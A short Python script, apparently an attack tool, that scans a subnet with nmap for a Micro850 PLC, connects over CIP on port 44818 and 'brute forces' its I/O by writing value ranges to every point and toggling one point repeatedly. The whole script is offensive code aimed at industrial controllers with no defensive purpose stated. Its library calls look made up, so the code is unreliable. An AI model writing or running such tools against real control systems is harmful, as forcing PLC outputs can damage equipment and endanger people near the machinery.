import subprocess
from scapy.all import *
import time
import threading
from pycomm import CIP

# Define the subnet to scan
subnet = '192.168.1.0/24'

def find_plc_ip(subnet):
    try:
        output = subprocess.check_output(['nmap', '-sP', subnet]).decode('utf-8')
        for line in output.split('\n'):
            if 'Micro850' in line:  
                ip_address = line.split(' ')[-1]
                return ip_address
    except Exception as e:
        print(f"Failed to find PLC IP: {e}")
        return None

def brute_force_io(plc_ip):
    try:
        # Create a CIP connection to the PLC
        cip_client = CIP.Client(plc_ip, 44818)
        
        # Login to the PLC
        cip_client.connect()
        cip_client.login()
        
        # Get the list of I/O points
        io_points = cip_client.get_io_points()
        
        # Print the list of I/O points
        print("I/O Points:")
        print(io_points)
        
        # Brute force I/O by changing a range of I/O point values
        for point in io_points:
            for value in range(0, 100):
                cip_client.set_io_point(point, value)
                time.sleep(0.1)
        
        # Or, brute force I/O by changing a single I/O point value repeatedly
        point = "I0/0"  # Replace with the actual I/O point
        for _ in range(100):
            cip_client.set_io_point(point, True)
            time.sleep(0.1)
            cip_client.set_io_point(point, False)
            time.sleep(0.1)
        
        print("Brute force I/O completed")
    except Exception as e:
        print(f"Failed to perform brute force I/O: {e}")

def main():
    plc_ip = find_plc_ip(subnet)
    if plc_ip:
        print(f"PLC IP Address: {plc_ip}")
        
        while True:
            print("1. Brute Force I/O")
            print("2. Exit")
            choice = input("Enter your choice: ")
            
            if choice == "1":
                brute_force_io(plc_ip)
            elif choice == "2":
                break
            else:
                print("Invalid choice. Please try again.")
    else:
        print("PLC not found.")

if __name__ == "__main__":
    main()